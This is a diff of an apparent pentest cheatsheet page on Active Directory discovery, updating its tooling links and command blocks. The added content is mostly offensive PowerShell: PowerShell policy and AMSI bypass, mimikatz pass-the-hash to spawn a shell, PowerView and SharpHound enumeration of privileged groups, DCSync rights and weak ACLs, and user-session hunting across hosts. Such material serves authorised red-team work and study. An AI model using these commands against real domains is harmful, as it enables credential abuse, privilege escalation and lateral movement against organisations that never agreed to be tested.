@@ -3,11 +3,14 @@ layout: post
 title: discovery / ad 
 category: 01-discovery
 parent: cheatsheets
-modified_date: 2023-09-18
+modified_date: 2024-12-04
 permalink: /discov/ad
 ---
 
-**Mitre Att&ck Entreprise**: [TA0007 - Discovery](https://attack.mitre.org/tactics/TA0007/)
+**Useful links** 
+- [learn AD security](/sysadmin/win-ad-sec-awesome/#starting-your-journey)
+- [TA0007 - Discovery](https://attack.mitre.org/tactics/TA0007/)
+- [Interesting AD cheatsheets](/sysadmin/win-ad-sec-awesome/#OffensivePowershell)
 
 **Menu**
 <!-- vscode-markdown-toc -->
@@ -64,9 +67,18 @@ permalink: /discov/ad
 	/vscode-markdown-toc-config -->
 <!-- /vscode-markdown-toc -->
 
- !!! **Useful links** to [learn AD security](/sysadmin/win-ad-sec-awesome/#starting-your-journey) !!!
+**Tools**
 
-Cheatsheet inspired more various [ones](/sysadmin/win-ad-sec-awesome/#OffensivePowershell).
+<script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
+<script>$(window).load(function() {var repos = [""]; for (rep in repos) {$.ajax({type: "GET", url: repos[rep], dataType: "json", success: function(result) {$("#repo_list").append("<tr><td><a href='" + result.html_url + "' target='_blank'>" + result.name + "</a></td><td>" + result.pushed_at + "</td><td>" + result.stargazers_count + "</td><td>" + result.subscribers_count + "</td><td>" + result.language + "</td></tr>"); console.log(result);}});}console.log(result);});</script>
+
+<link href="/sortable.css" rel="stylesheet" />
+<script src="/sortable.js"></script>
+<div id="repos">
+    <table id="repo_list" class="sortable">
+      <tr><th>_repo</th><th>_last_push</th><th>_stars</th><th>_watch</th><th>_language</th></tr>
+    </table>
+</div>
 
 ![Enumeration Strategy](/assets/images/ad_enum_strat.png)
 
@@ -108,22 +120,23 @@ runas /netonly /user:adm_x@dom.corp powershell
 ### <a name='run-powershell'></a>run-powershell
 
 
-#### <a name='bypass-exec-powershell'></a>bypass-exec-powershell
+#### <a name='bypass-exec-powershell'></a>bypass-amsi
 
 #### <a name='load-powersploit'></a>load-powersploit
 
-* run powershell:
-```
+```powershell
+# open cmd.exe as admin
 powershell -ep bypass
+C:\Tools>C:\Tools\Invishell\RunWithRegistryNonAdmin.bat
+.\PowerView.ps1
 
 # run powershell with pass-the-hash
 mimikatz.exe
 privilege::debug
 sekurlsa::pth /user:$zlat_user /rc4:xxx  /domain:$zdom /dc:$zdom_dc_fqdn /run:"powershell -ep bypass"
-```
+.\PowerView.ps1
 
-* Mandiant Commando VM
-```powershell
+# Mandiant Commando VM
 cd C:\tools\PowerSploit\Recon
 Import-Module ./Recon.psm1
 gcm -m Recon
@@ -254,9 +267,11 @@ References :
 
 #### <a name='shoot-priv-users'></a>shoot-priv-users
 ```powershell
-# DCSync
-get-netuser -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select -first 1 #get the domain's distinguisedname attribute
+# get the domain's distinguisedname attribute
+get-netuser -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select -first 1 
 $zdom_dn = "DC=" + $zdom + ",DC=" + $zforest # only valid if 2 levels
+
+# DCSync
 # TO DEBUG : get-forest error ...
 get-domainobjectacl $zdom_dn -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn -ResolveGUIDs | ? {
 	($_.ObjectType -match 'replication-get') -or
@@ -268,12 +283,12 @@ $search_base = "CN=AdminSDHolder,CN=System," + $zdom_dn
 Get-DomainObjectAcl -SearchBase $search_base -ResolveGUIDs -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
 
 # Privileged Groups
-$ztarg_grp="Domain Admins"
-#$ztarg_grp="Enterprise Admins"
-#$ztarg_grp="Backup Operators"
-#$ztarg_grp="Remote Desktop Users"
-#$ztarg_grp="DNSAdmins"
-Get-NetGroupMember $ztarg_grp -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn -Recurse | select membername
+$ztarg_group_name="Domain Admins"
+#$ztarg_group_name="Enterprise Admins"
+#$ztarg_group_name="Backup Operators"
+#$ztarg_group_name="Remote Desktop Users"
+#$ztarg_group_name="DNSAdmins"
+Get-NetGroupMember $ztarg_group_name -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn -Recurse | select membername
 
 # Protected Users 
 Get-NetGroupMember "Protected Users" -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select membername
@@ -365,11 +380,16 @@ Get-NetComputer -OperatingSystem "Windows 2008*" -Ping -Domain $zdom_fqdn -Domai
 
 #### <a name='shoot-dacl'></a>shoot-dacl
 ```powershell
+
 # STEP 1: global gathering
 Invoke-ACLScanner -ResolveGUIDs -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
 sharphound.exe --CollectionMethod ACL --domain $zdom_fqdn --domaincontroller $zdom_dc_fqdn
 
-# STEP 2: check for "authenticated users" and "everyone" group
+# STEP 2: check for "authenticated users", "everyone" group, target account
+Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match $ztarg_user_name}
+$ztarg_group_name="Authenticated Users"
+# $ztarg_group_name="Everyone"
+Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match $ztarg_group_name}
 
 # STEP 3: gather info on security groups
 #$ztarg_group="Domain Computers"
@@ -404,7 +424,7 @@ wmic useraccount where name=$ztarg_user_name get sid
 
 ### <a name='iter-memberof'></a>iter-memberof
 ```powershell
-# identify if the new account is 'memberof' new groups 
+# identify if the new account is 'memberof' new groups
 get-netgroup -MemberIdentity $ztarg_user_name -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select cn | ft -autosize >> .\grp_xxx.txt
 
 # identify if the new account is 'memberof' new groups 
@@ -442,6 +462,9 @@ REFRESH(ed) Enumeration:
 
 ### <a name='check-computer-access'></a>check-computer-access
 ```powershell
+# listing the kerberos tickets
+klist
+
 # check smb admin share access 
 dir \\$ztarg_computer_fqdn\c$
 
@@ -479,6 +502,7 @@ Who is logged on a computer:
 ```powershell
 # get actively logged users on a computer
 Get-NetLoggedon -ComputerName $ztarg_computer_fqdn
+Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access
 
 # get last logged users on a computer / uses remote registry / can be blocked
 Get-LastLoggedon -ComputerName $ztarg_computer -Credential $zlat_creds
@@ -498,16 +522,15 @@ Get-DomainOU -Identity $ztarg_computer -Domain $zdom_fqdn -DomainController $zdo
 ### <a name='whereis-user'></a>whereis-user
 Where targeted user is connected
 ```powershell
-$ztarg_user=xxx
-Invoke-UserHunter $ztarg_user -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
-Invoke-UserHunter $ztarg_user -CheckAccess -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
-Invoke-UserHunter $ztarg_user -CheckAccess -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select username, computername, IPAddress
+Invoke-UserHunter $ztarg_user_name -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
+Invoke-UserHunter $ztarg_user_name -CheckAccess -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
+Invoke-UserHunter $ztarg_user_name -CheckAccess -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select username, computername, IPAddress
 ```
 
 ### <a name='whereis-group'></a>whereis-group
 Where targeted users' group are connected
 ```powershell
-Invoke-UserHunter -Group $ztarg_grp -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select computername, membername
+Invoke-UserHunter -Group $ztarg_group_name -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select computername, membername
 ```
 
 
